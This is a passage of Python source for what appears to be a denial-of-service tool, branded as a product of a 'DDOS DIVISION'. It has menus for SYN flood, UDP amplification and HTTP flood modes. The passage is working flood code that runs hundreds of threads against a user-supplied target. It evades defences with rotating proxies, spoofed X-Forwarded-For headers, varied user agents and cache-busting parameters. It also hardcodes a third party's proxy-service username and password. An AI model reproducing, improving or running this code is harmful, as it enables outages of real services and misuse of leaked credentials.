                        session.request(
                            url=self.target,
                            params=params,
                            proxies=proxies,
                            verify=False,
                            allow_redirects=False,
                            timeout=1,
                            **req
                        )
                    except:
                        continue
            except:
                continue

    def rate_limited_executor(self):
        """Execute attack without threads"""
        if self.target_type == "udp":
            print("\n🔍 Testing connection to target...")
            try:
                # Test target connection
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                test_sock.settimeout(2)
                test_sock.sendto(b"test", (self.target_host, self.target_port))
                print("✅ Target is reachable")
            except socket.gaierror:
                print("❌ Could not resolve target hostname")
                return
            except socket.timeout:
                print("⚠️ Target not responding but continuing attack")
            except Exception as e:
                print(f"⚠️ Connection test error: {str(e)}")
            finally:
                try:
                    test_sock.close()
                except:
                    pass
            
            self.start_time = time.time()
            self.running = True
            try:
                self.execute_udp_attack()
            except KeyboardInterrupt:
                print("\n🛑 Stopping attack...")
                self.running = False
            print("\n⏳ Finalizing...")
            time.sleep(1)
        else:
            # Original HTTP/TCP code here
            self.execute_direct_attack()

    def burst_mode(self, burst_size=1000):
        """Execute continuous attack without threads"""
        layer_name = {
            'icmp': 'Layer 3 (ICMP)',
            'tcp': 'Layer 4 (TCP)', 
            'udp': 'Layer 4 (UDP)',
            'http': 'Layer 7 (HTTP)'
        }.get(self.target_type, 'Layer 7 (HTTP)')
        
        print(f"\n💥 Burst mode: {layer_name}")
        print(f"🎯 Target: {self.target}")
        print(f"⚡ Maximum speed mode activated")
        print("❌ Press Ctrl+C to stop\n")
        
        self.start_time = time.time()
        self.running = True
        
        try:
            self.execute_direct_attack()
        except KeyboardInterrupt:
            print("\n🛑 Stopping burst mode...")
            self.running = False
        
        print("\n⏳ Finalizing...")
        time.sleep(1)

    def multi_method_attack(self, duration=10):
        """Execute continuous attack using all methods without threads"""
        if not self.compatible_methods:
            print("❌ No compatible methods detected")
            return
            
        print("\n🎯 Starting multi-method attack...")
        print("⚡ Maximum speed mode activated")
        print("❌ Press Ctrl+C to stop\n")
        
        self.start_time = time.time()
        self.running = True
        
        try:
            while time.time() - self.start_time < duration and self.running:
                # Rotate through all compatible methods
                for method in self.compatible_methods:
                    if not self.running:
                        break
                        
                    session = requests.Session()
                    session.verify = not self.supports_ssl
                    
                    # Configure session
                    adapter = requests.adapters.HTTPAdapter(
                        max_retries=3,
                        pool_connections=1000,
                        pool_maxsize=1000
                    )
                    session.mount('http://', adapter)
                    session.mount('https://', adapter)
                    
                    # Generate request data
                    headers = self.get_request_headers()
                    if self.supports_cookies:
                        session.cookies.update(self.generate_cookies())
                        
                    proxies = self.get_session_id() if self.use_proxy else None
                    path, params = self.generate_request_pattern()
                    url = f"{self.target.rstrip('/')}{path}"
                    
                    request_data = {
                        'method': method,
                        'url': url,
                        'headers': headers,
                        'params': params,
                        'proxies': proxies,
                        'verify': not self.supports_ssl,
                        'allow_redirects': True,
                        'timeout': 5
                    }
                    
                    if method == 'POST' and self.compatible_content_types:
                        content_type = random.choice(list(self.compatible_content_types))
                        headers['Content-Type'] = content_type
                        if content_type == 'multipart/form-data':
                            request_data['files'] = self.generate_post_data(content_type)
                        else:
                            request_data['data'] = self.generate_post_data(content_type)
                    
                    try:
                        # Send request
                        start_time = time.time()
                        response = session.request(**request_data)
                        end_time = time.time()
                        
                        success = response.status_code < 400
                        result = {
                            'request_id': self.request_count,
                            'layer': 'Layer 7 (HTTP)',
                            'method': method,
                            'status_code': response.status_code,
                            'response_time': round(end_time - start_time, 3),
                            'content_length': len(response.content),
                            'timestamp': start_time,
                            'success': success
                        }
                        
                    except Exception as e:
                        result = {
                            'request_id': self.request_count,
                            'layer': 'Layer 7 (HTTP)',
                            'method': method,
                            'error': str(e),
                            'timestamp': time.time(),
                            'success': False
                        }
                    
                    with self.lock:
                        self.results.append(result)
                        self.request_count += 1
                    
        except KeyboardInterrupt:
            print("\n🛑 Attack stopped by user")
            self.running = False
        
        print("\n⏳ Finalizing...")
        time.sleep(1)
        self.print_detailed_stats()

    def generate_post_data(self, content_type):
        """Generate simple POST data"""
        return {'data': str(int(time.time()))}

    def detect_target_compatibility(self):
        """Detect which request types and features are compatible with the target"""
        if self.target_type != "http":
            return
            
        print("\n🔍 Detecting target compatibility...")
        session = requests.Session()
        session.verify = False  # Disable SSL verification for initial checks
        
        headers = self.get_request_headers()
        test_results = {
            'methods': {},
            'content_types': {},
            'features': {}
        }
        
        try:
            # Test HTTPS support
            if self.target.startswith('http://'):
                https_url = self.target.replace('http://', 'https://')
                try:
                    https_response = session.get(https_url, timeout=5, headers=headers)
                    self.supports_ssl = True
                    print("✅ HTTPS supported")
                except:
                    print("❌ HTTPS not supported")
            
            # Test different HTTP methods
            for method in ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE']:
                try:
                    response = session.request(
                        method=method,
                        url=self.target,
                        headers=headers,
                        timeout=5
                    )
                    if response.status_code < 405:  # If not Method Not Allowed
                        self.compatible_methods.add(method)
                        test_results['methods'][method] = True
                        print(f"✅ {method} supported")
                    else:
                        test_results['methods'][method] = False
                        print(f"❌ {method} not supported")
                except Exception as e:
                    test_results['methods'][method] = False
                    print(f"❌ {method} failed: {str(e)}")
            
            # Test different content types with POST
            if 'POST' in self.compatible_methods:
                for content_type in self.post_data_types:
                    try:
                        headers['Content-Type'] = content_type
                        data = self.generate_post_data(content_type)
                        response = session.post(
                            url=self.target,
                            headers=headers,
                            data=data,
                            timeout=5
                        )
                        if response.status_code < 415:  # If not Unsupported Media Type
                            self.compatible_content_types.add(content_type)
                            test_results['content_types'][content_type] = True
                            print(f"✅ Content-Type {content_type} supported")
                        else:
                            test_results['content_types'][content_type] = False
                            print(f"❌ Content-Type {content_type} not supported")
                    except Exception as e:
                        test_results['content_types'][content_type] = False
                        print(f"❌ Content-Type {content_type} failed: {str(e)}")
            
            # Test cookie support
            try:
                cookies = self.generate_cookies()
                response = session.get(
                    url=self.target,
                    headers=headers,
                    cookies=cookies,
                    timeout=5
                )
                self.supports_cookies = len(response.cookies) > 0 or 'Set-Cookie' in response.headers
                test_results['features']['cookies'] = self.supports_cookies
                print(f"{'✅' if self.supports_cookies else '❌'} Cookie support: {self.supports_cookies}")
            except Exception as e:
                test_results['features']['cookies'] = False
                print(f"❌ Cookie test failed: {str(e)}")
            
            # Test compression support
            try:
                headers['Accept-Encoding'] = 'gzip, deflate, br'
                response = session.get(
                    url=self.target,
                    headers=headers,
                    timeout=5
                )
                self.supports_compression = 'Content-Encoding' in response.headers
                test_results['features']['compression'] = self.supports_compression
                print(f"{'✅' if self.supports_compression else '❌'} Compression support: {self.supports_compression}")
            except Exception as e:
                test_results['features']['compression'] = False
                print(f"❌ Compression test failed: {str(e)}")
            
            # Test keep-alive support
            try:
                headers['Connection'] = 'keep-alive'
                response = session.get(
                    url=self.target,
                    headers=headers,
                    timeout=5
                )
                self.supports_keep_alive = response.headers.get('Connection', '').lower() == 'keep-alive'
                test_results['features']['keep_alive'] = self.supports_keep_alive
                print(f"{'✅' if self.supports_keep_alive else '❌'} Keep-Alive support: {self.supports_keep_alive}")
            except Exception as e:
                test_results['features']['keep_alive'] = False
                print(f"❌ Keep-Alive test failed: {str(e)}")
            
            # Gather server information
            try:
                response = session.get(
                    url=self.target,
                    headers=headers,
                    timeout=5
                )
                self.server_info = {
                    'server': response.headers.get('Server', 'Unknown'),
                    'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                    'content_type': response.headers.get('Content-Type', 'Unknown'),
                }
                print("\n📊 Server Information:")
                print(f"   Server: {self.server_info['server']}")
                print(f"   Powered By: {self.server_info['powered_by']}")
                print(f"   Content-Type: {self.server_info['content_type']}")
            except Exception as e:
                print(f"❌ Server info detection failed: {str(e)}")
            
        except Exception as e:
            print(f"⚠️ Compatibility detection error: {str(e)}")
        
        print("\n✨ Compatibility detection complete!")
        return test_results

    def generate_request_pattern(self):
        """Generate a simple request pattern"""
        return '/', {}

    def path_params(self):
        """Simple path parameters"""
        return {}

    def request_patterns(self):
        """Simple request patterns"""
        return {}

    def analyze_method_effectiveness(self):
        """Simple method analysis"""
        return

    def update_method_stats(self, method, success, response_time):
        """Simple stats update"""
        return

    def select_request_method(self):
        """Always return GET"""
        return 'GET'

    def get_best_method(self):
        """Always return GET"""
        return 'GET', 1.0

    def adaptive_thread_count(self):
        """Return fixed thread count"""
        return 1000

    def monitor_attack(self):
        """Real-time attack monitoring"""
        start_time = time.time()
        last_request_count = 0
        
        try:
            while self.running:
                current_time = time.time()
                elapsed = current_time - start_time
                current_requests = self.request_count
                
                # Calculate current RPS
                interval_requests = current_requests - last_request_count
                current_rps = interval_requests
                
                # Calculate success rate
                if self.results:
                    successful = len([r for r in self.results if r.get('success', False)])
                    success_rate = (successful / len(self.results)) * 100
                else:
                    success_rate = 0
                
                # Clear line and print stats
                sys.stdout.write('\033[2K\r')  # Clear line
                sys.stdout.write(
                    f"\033[92m⚡ Requests: {current_requests:,} | "
                    f"RPS: {current_rps:,.0f} | "
                    f"Success: {success_rate:.1f}% | "
                    f"Time: {elapsed:.1f}s"
                )
                
                if self.target_type == "http":
                    # Show HTTP-specific stats
                    status_codes = {}
                    response_times = []
                    
                    for result in self.results[-100:]:  # Look at last 100 requests
                        if 'status_code' in result:
                            status_codes[result['status_code']] = status_codes.get(result['status_code'], 0) + 1
                        if 'response_time' in result:
                            response_times.append(result['response_time'])
                    
                    if status_codes:
                        most_common = max(status_codes.items(), key=lambda x: x[1])
                        sys.stdout.write(f" | Status: {most_common[0]}")
                    
                    if response_times:
                        avg_time = sum(response_times) / len(response_times)
                        sys.stdout.write(f" | Avg Time: {avg_time:.2f}s")
                
                sys.stdout.write('\033[0m')
                sys.stdout.flush()
                
                last_request_count = current_requests
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            print(f"\nMonitoring error: {str(e)}")

    def execute_enhanced_attack(self):
        """Execute enhanced attack with maximum speed optimization and success validation"""
        print("\n🚀 Starting enhanced attack...")
        print(f"🎯 Target: {self.target}")
        print(f"🌐 Mode: {'Proxy' if self.use_proxy else 'Direct'} Attack")
        
        self.running = True
        self.start_time = time.time()
        self.results = []
        self.request_count = 0
        self.success_count = 0
        
        # Start monitoring in a separate thread
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            # Enhanced target validation with multiple attempts
            print("\n🔍 Validating target...")
            initial_status = 0
            validation_success = False
            
            for attempt in range(3):  # Try 3 times to validate
                try:
                    test_pool = urllib3.PoolManager(
                        timeout=urllib3.Timeout(connect=5, read=5),  # Increased timeouts
                        cert_reqs='CERT_NONE',
                        retries=urllib3.Retry(3, backoff_factor=0.1),
                        maxsize=100
                    )
                    test_response = test_pool.request('GET', self.target)
                    print(f"✅ Target is responsive (Status: {test_response.status})")
                    initial_status = test_response.status
                    validation_success = True
                    break
                except Exception as e:
                    print(f"⚠️ Validation attempt {attempt + 1} failed: {str(e)}")
                    time.sleep(1)  # Wait before retry
            
            if not validation_success:
                print("⚠️ Target validation failed, but continuing with optimized settings...")
            
            # Enhanced pool configuration
            pools = []
            pool_count = 25 if self.use_proxy else 50  # Reduced pool count for better stability
            
            for _ in range(pool_count):
                pool = urllib3.PoolManager(
                    maxsize=1000,
                    retries=urllib3.Retry(
                        total=2,  # Increased retries
                        backoff_factor=0.1,
                        status_forcelist=[429, 500, 502, 503, 504]
                    ),
                    timeout=urllib3.Timeout(connect=3, read=6),  # Increased timeouts
                    cert_reqs='CERT_NONE',
                    assert_hostname=False,
                    num_pools=50,
                    block=False
                )
                pools.append(pool)
            
            # Enhanced proxy handling
            proxy_configs = []
            if self.use_proxy and self.proxy_config:
                print("\n🔍 Testing proxy configurations...")
                test_url = "http://httpbin.org/ip"  # Test against reliable endpoint
                
                for i in range(50):  # Test more proxy configurations
                    session_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
                    username = self.proxy_config['username'].replace('f4YxGjAW', session_id)
                    proxy_url = f"http://{username}:{self.proxy_config['password']}@{self.proxy_config['host']}:{self.proxy_config['port']}"
                    
                    try:
                        test_pool = urllib3.ProxyManager(
                            proxy_url,
                            timeout=urllib3.Timeout(connect=3, read=3),
                            cert_reqs='CERT_NONE',
                            retries=False
                        )
                        test_response = test_pool.request('GET', test_url)
                        if test_response.status < 400:
                            proxy_configs.append({'http': proxy_url, 'https': proxy_url})
                            print(f"✅ Working proxy found ({len(proxy_configs)})")
                            if len(proxy_configs) >= 10:  # Get at least 10 working proxies
                                break
                    except:
                        continue
                
                if proxy_configs:
                    print(f"\n✅ Found {len(proxy_configs)} working proxies")
                    proxy_configs = proxy_configs * 5  # Multiply working proxies
                else:
                    print("\n⚠️ No working proxies found, switching to direct connection")
                    self.use_proxy = False
            
            # Enhanced request variations
            methods = ['GET', 'POST', 'HEAD'] if initial_status != 405 else ['GET']
            paths = ['/', '/index.html', '/api', '/test', '/status', '/health']
            
            # Enhanced User-Agent rotation
            rotating_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]
            
            # Enhanced headers with better browser simulation
            base_headers = []
            for agent in rotating_agents:
                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'User-Agent': agent,
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                }
                base_headers.append(headers)
            
            # Enhanced payloads with more variety
            payloads = [
                b'data=test&type=status',
                b'{"action":"status","id":"test"}',
                b'status=check&time=' + str(int(time.time())).encode(),
                b'ping=1&timestamp=' + str(int(time.time())).encode(),
                urlencode({'test': 'data', 'time': str(int(time.time()))}).encode()
            ]
            
            # Initialize counters
            request_count = 0
            pool_index = 0
            proxy_index = 0
            header_index = 0
            
            # Optimized thread pool
            max_workers = 250 if self.use_proxy else 500  # Reduced for better stability
            
            def send_request():
                nonlocal request_count, pool_index, proxy_index, header_index
                
                while self.running:
                    try:
                        # Rotate through pools
                        pool = pools[pool_index]
                        pool_index = (pool_index + 1) % len(pools)
                        
                        # Handle proxy rotation
                        if proxy_configs:
                            proxies = proxy_configs[proxy_index]
                            proxy_index = (proxy_index + 1) % len(proxy_configs)
                            pool.proxy = proxies
                        
                        # Rotate through methods and paths
                        method = methods[request_count % len(methods)]
                        path = paths[request_count % len(paths)]
                        
                        # Enhanced URL with better cache busting
                        timestamp = int(time.time() * 1000)
                        random_param = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))
                        url = f"{self.target.rstrip('/')}{path}?_={timestamp}&{random_param}={request_count}"
                        
                        # Rotate headers with enhanced browser simulation
                        headers = base_headers[header_index].copy()
                        header_index = (header_index + 1) % len(base_headers)
                        
                        # Add dynamic headers
                        headers['X-Request-ID'] = f"{timestamp}-{random.randint(1000,9999)}"
                        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        
                        # Prepare request data
                        request_data = None
                        if method == 'POST':
                            request_data = payloads[request_count % len(payloads)]
                            headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        
                        # Enhanced request with better error handling
                        start_time = time.time()
                        try:
                            response = pool.request(
                                method=method,
                                url=url,
                                headers=headers,
                                body=request_data,
                                timeout=urllib3.Timeout(connect=2, read=4),
                                retries=False,
                                preload_content=False
                            )
                            
                            status = response.status
                            # Consider more status codes as success
                            success = status < 500 and status != 429  # Accept anything except server errors and rate limits
                            response.drain_conn()
                            
                            if success:
                                with self.lock:
                                    self.success_count += 1
                            
                        except urllib3.exceptions.TimeoutError:
                            # Retry once on timeout with increased timeout
                            try:
                                response = pool.request(
                                    method=method,
                                    url=url,
                                    headers=headers,
                                    body=request_data,
                                    timeout=urllib3.Timeout(connect=3, read=6),
                                    retries=False,
                                    preload_content=False
                                )
                                status = response.status
                                success = status < 500 and status != 429
                                response.drain_conn()
                                
                                if success:
                                    with self.lock:
                                        self.success_count += 1
                            except:
                                status = 0
                                success = False
                        except:
                            status = 0
                            success = False
                        
                        # Track results
                        with self.lock:
                            self.request_count += 1
                            if len(self.results) < 1000:  # Keep last 1000 results
                                self.results.append({
                                    'success': success,
                                    'status': status,
                                    'timestamp': start_time,
                                    'method': method,
                                    'path': path
                                })
                        
                        request_count += 1
                        
                        # Small delay between requests for stability
                        time.sleep(0.01)
                        
                    except Exception as e:
                        continue
            
            print("\n⚡ Starting attack threads...")
            
            # Enhanced batch processing
            batch_number = 0
            active_threads = 0
            max_active_threads = max_workers
            
            with ThreadPoolExecutor(max_workers=max_active_threads) as executor:
                futures = []
                
                try:
                    while self.running:
                        batch_number += 1
                        batch_size = 25  # Smaller batch size for better control
                        
                        # Clean up completed futures
                        futures = [f for f in futures if not f.done()]
                        active_threads = len(futures)
                        
                        # Add new batch if we have room
                        if active_threads < max_active_threads:
                            new_threads = min(batch_size, max_active_threads - active_threads)
                            print(f"\r💥 Starting batch #{batch_number} (+{new_threads} threads) | Active: {active_threads + new_threads}", end='')
                            
                            for _ in range(new_threads):
                                if not self.running:
                                    break
                                futures.append(executor.submit(send_request))
                            
                            # Adaptive delay between batches
                            if self.success_count > 0:
                                time.sleep(0.05)  # Shorter delay if we're having success
                            else:
                                time.sleep(0.1)  # Longer delay if no success
                        
                        # Print detailed status
                        if self.request_count > 0:
                            success_rate = (self.success_count / self.request_count) * 100
                            print(f"\r💥 Batch #{batch_number} | Active Threads: {active_threads} | "
                                  f"Success Rate: {success_rate:.1f}% ({self.success_count}/{self.request_count})", end='')
                
                except KeyboardInterrupt:
                    print("\n\n🛑 Attack stopped by user")
                    self.running = False
                
                # Graceful shutdown
                print("\n⏳ Stopping threads...")
                for future in futures:
                    future.cancel()
                executor.shutdown(wait=False, cancel_futures=True)
            
        except KeyboardInterrupt:
            print("\n\n🛑 Attack stopped by user")
        finally:
            self.running = False
            for pool in pools:
                try:
                    pool.clear()
                except:
                    pass
            monitor_thread.join(timeout=1)
            
            # Print final statistics
            if self.request_count > 0:
                final_success_rate = (self.success_count / self.request_count) * 100
                print(f"\n\n📊 Final Statistics:")
                print(f"Total Requests: {self.request_count}")
                print(f"Successful: {self.success_count}")
                print(f"Success Rate: {final_success_rate:.1f}%")
                
                if self.results:
                    status_counts = {}
                    for result in self.results:
                        status = result.get('status', 0)
                        status_counts[status] = status_counts.get(status, 0) + 1
                    
                    print("\nStatus Code Distribution:")
                    for status, count in sorted(status_counts.items()):
                        print(f"Status {status}: {count} requests")
            
            print("\n⏳ Finalizing...")
            time.sleep(1)

    def execute_direct_attack(self):
        """Execute direct attack with maximum effectiveness"""
        self.execute_enhanced_attack()

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n\n🛑 Stopping attack...")
    sys.exit(0)

def print_blinking_banner():
    """Print the banner with enhanced hacker theme"""
    import sys
    import time
    
    # ANSI color codes for hacker theme
    colors = [
        '\033[38;5;46m',   # Bright Green
        '\033[38;5;196m',  # Bright Red
        '\033[38;5;51m',   # Cyan
        '\033[38;5;201m',  # Magenta
        '\033[38;5;226m'   # Yellow
    ]
    
    banner = """
\033[38;5;46m
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █░░░░░░░░▀█▄░░░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█
    █░░▄▀▀▀▀▀▀░░░▀█▄░░░░░░░░░░░░▄█▀░░░▀▀▀▀▀▄░█░░▄▀▀▀▀▀▀░░░░▄█▀░░░▀▀▀▀▀▄░░█
    █░░█▄▄░░░░░░░░░░▀█▄░░░░░░▄█▀░░░░░░░░▄▄█░█░░█▄▄░░░░░░▄█▀░░░░░░░░▄▄█░░░█
    █░░░░░▀█▄░░░░░░░░░░▀█▄▄█▀░░░░░░░░▄█▀░░░░█░░░░░▀█▄▄█▀░░░░░░░░▄█▀░░░░░░█
    █░░░░░░░░▀█▄░░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█░░░░░░░░░░░░░░░░▄█▀░░░░░░░░░█
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

             ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
             ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
             ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
             ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ 
             ███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║  
             ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  
                                                      
                      [ADVANCED NETWORK STRESS  TOOL]
                    [CREATED BY: (BTR) DDOS DIVISION]
                        [USE AT YOUR OWN RISK]
\033[0m"""
    
    matrix_rain = [
        "1010101010101",
        "0101010101010",
        "1100110011001",
        "0011001100110"
    ]
    
    try:
        # Matrix rain effect
        for _ in range(3):
            for rain in matrix_rain:
                sys.stdout.write('\033[2J\033[H')  # Clear screen
                print('\033[38;5;46m' + rain + '\033[0m')  # Green matrix rain
                time.sleep(0.1)
        
        # Final banner display with glitch effect
        sys.stdout.write('\033[2J\033[H')  # Clear screen
        for color in colors:
            sys.stdout.write('\033[2J\033[H')
            print(color + banner + '\033[0m')
            time.sleep(0.1)
        
        # Final static display in green
        sys.stdout.write('\033[2J\033[H')
        print('\033[38;5;46m' + banner + '\033[0m')
        
    except KeyboardInterrupt:
        sys.stdout.write('\033[2J\033[H')
        print('\033[38;5;46m' + banner + '\033[0m')

def print_banner():
    """Print the tool banner"""
    print_blinking_banner()

def print_menu():
    """Print the enhanced hacker-themed menu"""
    print("\n\033[38;5;46m╔════════════════════════════════════════╗")
    print("║             \033[38;5;196mATTACK MODES\033[38;5;46m             ║")
    print("╠════════════════════════════════════════╣")
    print("║ [\033[38;5;226m1\033[38;5;46m] ICMP    [\033[38;5;226mPING OF DEATH\033[38;5;46m]        ║")
    print("║ [\033[38;5;226m2\033[38;5;46m] TCP     [\033[38;5;226mSYN FLOOD\033[38;5;46m]            ║")
    print("║ [\033[38;5;226m3\033[38;5;46m] UDP     [\033[38;5;226mAMPLIFICATION\033[38;5;46m]        ║")
    print("║ [\033[38;5;226m4\033[38;5;46m] HTTP    [\033[5m\033[38;5;196mLAY-DOWN 7\033[0m\033[38;5;46m]            ║")
    print("╚════════════════════════════════════════╝\033[0m")

def print_attack_banner(attack_type, target):
    """Print cool attack initiation banner"""
    print(f"""
\033[38;5;46m╔══════════════════════════════════════════════════════════╗
║                     ATTACK INITIATED                      ║
╠══════════════════════════════════════════════════════════╣
║ TARGET: \033[38;5;196m{target[:40]}\033[38;5;46m
║ MODE:   \033[38;5;196m{attack_type}\033[38;5;46m
║ STATUS: \033[38;5;226mINITIALIZING ATTACK VECTORS\033[38;5;46m
╚══════════════════════════════════════════════════════════╝\033[0m
""")

def print_status(request_count, success_count, current_rps, elapsed_time):
    """Print enhanced status with hacker theme"""
    status_bar = f"""
\033[38;5;46m╔═══════════════════════ ATTACK STATUS ═══════════════════════╗
║ REQUESTS: \033[38;5;226m{request_count:,}\033[38;5;46m                                          
║ SUCCESS:  \033[38;5;226m{success_count:,}\033[38;5;46m
║ RPS:      \033[38;5;226m{current_rps:.1f}\033[38;5;46m
║ TIME:     \033[38;5;226m{elapsed_time:.1f}s\033[38;5;46m
╚════════════════════════════════════════════════════════════╝\033[0m"""
    print(status_bar, end='\r')

def print_final_stats(total_requests, successful, failed, duration, rps):
    """Print enhanced final statistics"""
    stats = f"""
\033[38;5;46m╔═══════════════════════ FINAL REPORT ════════════════════════╗
║                                                                ║
║  TARGET STATUS:    \033[38;5;226m{"BREACHED" if successful > failed else "RESISTANT"}\033[38;5;46m
║  TOTAL REQUESTS:   \033[38;5;226m{total_requests:,}\033[38;5;46m
║  SUCCESSFUL HITS:  \033[38;5;226m{successful:,}\033[38;5;46m
║  FAILED ATTEMPTS:  \033[38;5;226m{failed:,}\033[38;5;46m
║  ATTACK DURATION:  \033[38;5;226m{duration:.2f}s\033[38;5;46m
║  AVG REQUESTS/SEC: \033[38;5;226m{rps:.1f}\033[38;5;46m
║                                                                ║
╚════════════════════════════════════════════════════════════════╝\033[0m"""
    print(stats)

def main():
    """Enhanced main function with hacker theme"""
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        print_blinking_banner()
        print_menu()
        
        try:
            layer_choice = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Select attack mode: \033[38;5;226m").strip() or "4"
            
            layer_map = {
                "1": "icmp",
                "2": "tcp", 
                "3": "udp",
                "4": "http"
            }
            
            target_type = layer_map.get(layer_choice, "http")
            
            if target_type == "icmp":
                target = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter target IP: \033[38;5;226m").strip()
            elif target_type in ["tcp", "udp"]:
                target = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter target IP:PORT: \033[38;5;226m").strip()
            else:
                target = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter target URL: \033[38;5;226m").strip()
            
            use_proxy = False
            proxy_config = None
            
            if target_type == "http":
                use_proxy = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Use proxy? (y/n): \033[38;5;226m").strip().lower() == 'y'
                
                if use_proxy:
                    use_default = input("\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Use default proxy? (y/n): \033[38;5;226m").strip().lower() != 'n'
                    
                    if use_default:
                        proxy_config = {
                            'host': 'aus.360s5.com',
                            'port': '3600',
                            'username': '82942143-zone-custom-sessid-f4YxGjAW',
                            'password': 'dp7BTFPX'
                        }
                    else:
                        print("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Enter proxy details:")
                        proxy_config = {
                            'host': input("\033[38;5;46m├─[\033[38;5;226m+\033[38;5;46m] Host: \033[38;5;226m").strip(),
                            'port': input("\033[38;5;46m├─[\033[38;5;226m+\033[38;5;46m] Port: \033[38;5;226m").strip(),
                            'username': input("\033[38;5;46m├─[\033[38;5;226m+\033[38;5;46m] Username: \033[38;5;226m").strip(),
                            'password': input("\033[38;5;46m└─[\033[38;5;226m+\033[38;5;46m] Password: \033[38;5;226m").strip()
                        }
            
            print("\n\033[38;5;46m╔════════════════════════════════════════╗")
            print("║             \033[38;5;196mATTACK POWER\033[38;5;46m             ║")
            print("╠════════════════════════════════════════╣")
            print("║ [\033[38;5;226m1\033[38;5;46m] SURGICAL    [\033[38;5;226mRATE LIMITED\033[38;5;46m]     ║")
            print("║ [\033[38;5;226m2\033[38;5;46m] TACTICAL    [\033[38;5;226mMULTI-METHOD\033[38;5;46m]     ║")
            print("║ [\033[38;5;226m3\033[38;5;46m] NUCLEAR     [\033[38;5;226mMAX POWER\033[38;5;46m]        ║")
            print("╚════════════════════════════════════════╝\033[0m")
            
            mode = input("\n\033[38;5;46m[\033[38;5;226m*\033[38;5;46m] Select attack power: \033[38;5;226m").strip() or "1"
            
            print("\n\033[38;5;196m[!] DISCLAIMER: USE AT YOUR OWN RISK [!]\033[0m")
            time.sleep(1)
            
            print("\n\033[38;5;46m[*] Initializing attack vectors...")
            time.sleep(0.5)
            print("[*] Calibrating payload delivery...")
            time.sleep(0.5)
            print("[*] Engaging target systems...\033[0m")
            time.sleep(0.5)
            
            attack_type = {
                "1": "SURGICAL STRIKE",
                "2": "TACTICAL ASSAULT",
                "3": "NUCLEAR OPTION"
            }.get(mode, "UNKNOWN")
            
            print_attack_banner(attack_type, target)
            
            tester = NetworkLayerTester(target, target_type, use_proxy=use_proxy, proxy_config=proxy_config)
            
            try:
                if mode == "1":
                    tester.rate_limited_executor()
                elif mode == "2":
                    tester.multi_method_attack()
                else:
                    tester.burst_mode()
            except KeyboardInterrupt:
                print("\n\n\033[38;5;196m[!] ATTACK ABORTED BY OPERATOR [!]\033[0m")
                sys.exit(0)
            except Exception as e:
                print(f"\n\n\033[38;5;196m[!] ATTACK ERROR: {str(e)} [!]\033[0m")
                sys.exit(1)
            
        except KeyboardInterrupt:
            print("\n\n\033[38;5;196m[!] OPERATION CANCELLED [!]\033[0m")
            sys.exit(0)
        except Exception as e:
